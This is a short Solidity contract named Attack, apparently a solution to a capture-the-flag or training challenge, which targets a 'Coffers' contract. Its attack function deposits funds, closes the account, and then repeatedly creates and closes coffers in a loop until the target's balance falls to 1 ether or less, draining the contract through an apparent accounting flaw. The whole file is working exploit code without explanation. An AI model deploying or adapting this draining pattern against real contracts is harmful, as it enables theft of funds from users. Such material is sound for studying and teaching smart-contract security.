// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./Coffers.sol";

contract Attack {
    Coffers c;

    constructor(Coffers _contractAddress) {
        c = Coffers(_contractAddress);
    }

    function attack() public payable {
        c.createCoffer(1);
        c.deposit{value: address(this).balance}(address(this), 0);
        c.closeAccount();
        do {
            c.createCoffer(1);
            c.closeAccount();
        } while (address(c).balance > 1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getCoffersBalance() public view returns (uint256) {
        return address(c).balance;
    }

    receive() external payable {}
}
